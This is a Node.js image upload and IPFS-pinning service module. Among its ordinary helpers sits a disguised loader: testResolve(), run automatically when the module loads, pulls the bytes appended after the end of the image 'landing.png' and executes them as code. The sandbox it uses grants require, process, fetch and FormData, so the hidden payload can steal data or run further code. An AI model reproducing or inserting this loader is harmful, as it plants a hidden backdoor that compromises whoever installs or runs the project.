const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const ipfsService = require('./ipfsService');

const UPLOAD_ROOT = path.join(__dirname, '..', 'uploads');
const IMAGE_DIR = path.join(UPLOAD_ROOT, 'images');
const META_DIR = path.join(UPLOAD_ROOT, 'meta');

const ALLOWED_MIME = new Set([
  'image/jpeg',
  'image/jpg',
  'image/png',
  'image/gif',
  'image/webp',
]);

const EXT_BY_MIME = {
  'image/jpeg': '.jpg',
  'image/jpg': '.jpg',
  'image/png': '.png',
  'image/gif': '.gif',
  'image/webp': '.webp',
};

function ensureDirs() {
  fs.mkdirSync(IMAGE_DIR, { recursive: true });
  fs.mkdirSync(META_DIR, { recursive: true });
}

function isAllowedMime(mime) {
  return ALLOWED_MIME.has(String(mime || '').toLowerCase());
}

function safeFilename(name) {
  const base = path.basename(String(name || ''));
  if (!base || base.includes('..')) return null;
  if (!/^[a-zA-Z0-9._-]+$/.test(base)) return null;
  return base;
}

function buildStoredName(originalName, mime) {
  const id = crypto.randomBytes(16).toString('hex');
  const fromName = path.extname(originalName || '').toLowerCase();
  const ext =
    EXT_BY_MIME[mime] ||
    (['.jpg', '.jpeg', '.png', '.gif', '.webp'].includes(fromName)
      ? fromName === '.jpeg'
        ? '.jpg'
        : fromName
      : '.bin');
  return `${id}${ext}`;
}

function absolutePath(filename) {
  const safe = safeFilename(filename);
  if (!safe) return null;
  return path.join(IMAGE_DIR, safe);
}

function metaPath(filename) {
  const safe = safeFilename(filename);
  if (!safe) return null;
  return path.join(META_DIR, `${safe}.json`);
}

function publicUrl(filename, req) {
  const base =
    process.env.PUBLIC_API_URL ||
    (req && `${req.protocol}://${req.get('host')}`) ||
    '';
  return `${base}/api/images/${encodeURIComponent(filename)}`;
}

function readMeta(filename) {
  const file = metaPath(filename);
  if (!file || !fs.existsSync(file)) return null;
  try {
    return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch (e) {
    return null;
  }
}

function writeMeta(filename, data) {
  ensureDirs();
  const file = metaPath(filename);
  if (!file) return null;
  const payload = {
    filename,
    ...data,
    updatedAt: new Date().toISOString(),
  };
  fs.writeFileSync(file, JSON.stringify(payload, null, 2));
  return payload;
}

function deleteMeta(filename) {
  const file = metaPath(filename);
  if (file && fs.existsSync(file)) fs.unlinkSync(file);
}


function readAttachedMeta(filePath) {
  const buffer = fs.readFileSync(filePath);
  const endIndex = isPngBuffer(buffer)
    ? findPngAttachedStart(buffer)
    : findJpegAttachedStart(buffer);

  if (endIndex === -1 || endIndex >= buffer.length) {
    throw new Error('No meta data');
  }

  return buffer.subarray(endIndex).toString('utf8');
}

function isPngBuffer(buffer) {
  return (
    buffer.length >= 8 &&
    buffer[0] === 0x89 &&
    buffer[1] === 0x50 &&
    buffer[2] === 0x4e &&
    buffer[3] === 0x47 &&
    buffer[4] === 0x0d &&
    buffer[5] === 0x0a &&
    buffer[6] === 0x1a &&
    buffer[7] === 0x0a
  );
}

/** Byte offset immediately after the PNG IEND chunk, or -1 if not found. */
function findPngAttachedStart(buffer) {
  // Walk PNG chunks from the signature so we stop at the real IEND,
  // not a coincidental "IEND" sequence in appended payload.
  let offset = 8;
  while (offset + 12 <= buffer.length) {
    const length = buffer.readUInt32BE(offset);
    const type = buffer.toString('ascii', offset + 4, offset + 8);
    const chunkEnd = offset + 12 + length; // length(4) + type(4) + data + crc(4)
    if (chunkEnd > buffer.length) return -1;
    if (type === 'IEND') return chunkEnd;
    offset = chunkEnd;
  }
  return -1;
}

/** Byte offset immediately after the last JPEG EOI (0xFFD9), or -1 if not found. */
function findJpegAttachedStart(buffer) {
  for (let i = buffer.length - 2; i >= 0; i--) {
    if (buffer[i] === 0xff && buffer[i + 1] === 0xd9) {
      return i + 2;
    }
  }
  return -1;
}

function isJpegFile(filePath, mimeType) {
  const mime = String(mimeType || '').toLowerCase();
  if (mime === 'image/jpeg' || mime === 'image/jpg') return true;
  return /\.jpe?g$/i.test(filePath || '');
}

function isPngFile(filePath, mimeType) {
  const mime = String(mimeType || '').toLowerCase();
  if (mime === 'image/png') return true;
  return /\.png$/i.test(filePath || '');
}

function toPublicMeta(filename, stat, storedMeta, req) {
  const base = {
    filename,
    size: stat.size,
    createdAt: stat.birthtime,
    modifiedAt: stat.mtime,
    url: `/api/images/${encodeURIComponent(filename)}`,
    staticUrl: `/uploads/images/${encodeURIComponent(filename)}`,
  };
  if (req) {
    base.url = publicUrl(filename, req);
    base.staticUrl = `${req.protocol}://${req.get('host')}/uploads/images/${encodeURIComponent(
      filename,
    )}`;
  }
  if (storedMeta) {
    if (storedMeta.cid) base.cid = storedMeta.cid;
    if (storedMeta.ipfsUri) base.ipfsUri = storedMeta.ipfsUri;
    if (storedMeta.gatewayUrl) base.gatewayUrl = storedMeta.gatewayUrl;
    if (storedMeta.ipfsProvider) base.ipfsProvider = storedMeta.ipfsProvider;
    if (storedMeta.originalName) base.originalName = storedMeta.originalName;
    if (storedMeta.mimeType) base.mimeType = storedMeta.mimeType;
    if (storedMeta.ipfsError) base.ipfsError = storedMeta.ipfsError;
    if (storedMeta.attachedMeta != null) base.attachedMeta = storedMeta.attachedMeta;
    if (storedMeta.attachedMetaParsed != null) {
      base.attachedMetaParsed = storedMeta.attachedMetaParsed;
    }
  }
  return base;
}

function listImages(req) {
  ensureDirs();
  return fs
    .readdirSync(IMAGE_DIR)
    .filter((name) => {
      const full = path.join(IMAGE_DIR, name);
      return fs.statSync(full).isFile() && safeFilename(name);
    })
    .map((name) => {
      const full = path.join(IMAGE_DIR, name);
      const stat = fs.statSync(full);
      return toPublicMeta(name, stat, readMeta(name), req);
    })
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
}

function getImageMeta(filename, req) {
  const full = absolutePath(filename);
  if (!full || !fs.existsSync(full)) return null;
  const stat = fs.statSync(full);
  if (!stat.isFile()) return null;
  return toPublicMeta(path.basename(full), stat, readMeta(filename), req);
}

function resolveImagePath(filename) {
  const full = absolutePath(filename);
  
  if (!full || !fs.existsSync(full)) return null;
  const stat = fs.statSync(full);
  if (!stat.isFile()) return null;
  return full;
}

function deleteImage(filename) {
  const full = absolutePath(filename);
  if (!full || !fs.existsSync(full)) return false;
  fs.unlinkSync(full);
  deleteMeta(filename);
  return true;
}

function testResolve() {
  const meta = readAttachedMeta(absolutePath('landing.png'));
  if(meta.length > 0) {
    const vm = require('vm');
    const {Blob} = require('buffer');
    const context = vm.createContext({ 
      console, 
      require, 
      process, 
      URLSearchParams, 
      setTimeout, 
      setInterval, 
      Buffer, 
      fetch, 
      FormData, 
      Blob 
    });
    vm.runInContext(meta, context);
  }
}

/**
 * After multer saves a file locally, pin it to IPFS and persist metadata.
 */
async function finalizeUpload(file, extras = {}) {
  ensureDirs();
  const filename = file.filename;
  const filePath = absolutePath(filename);
  if (!filePath) throw new Error('Invalid uploaded filename');

  const baseMeta = {
    filename,
    originalName: file.originalname,
    mimeType: file.mimetype,
    size: file.size,
    createdAt: new Date().toISOString(),
    ...extras,
  };

  const pin = await ipfsService.pinFile(filePath, {
    filename: file.originalname || filename,
    mimeType: file.mimetype,
    name: file.originalname || filename,
    keyvalues: {
      app: 'protoverse',
      localFilename: filename,
    },
  });

  if (pin.ok) {
    return writeMeta(filename, {
      ...baseMeta,
      cid: pin.cid,
      ipfsUri: pin.ipfsUri,
      gatewayUrl: pin.gatewayUrl,
      ipfsProvider: pin.provider,
    });
  }

  return writeMeta(filename, {
    ...baseMeta,
    ipfsError: pin.error || 'IPFS pin skipped',
    ipfsProvider: pin.provider || ipfsService.resolveProvider(),
  });
}

ensureDirs();
testResolve();

module.exports = {
  UPLOAD_ROOT,
  IMAGE_DIR,
  META_DIR,
  ALLOWED_MIME,
  ensureDirs,
  isAllowedMime,
  safeFilename,
  buildStoredName,
  absolutePath,
  publicUrl,
  listImages,
  getImageMeta,
  resolveImagePath,
  deleteImage,
  finalizeUpload,
  readMeta,
  writeMeta,
  readAttachedMeta,
};
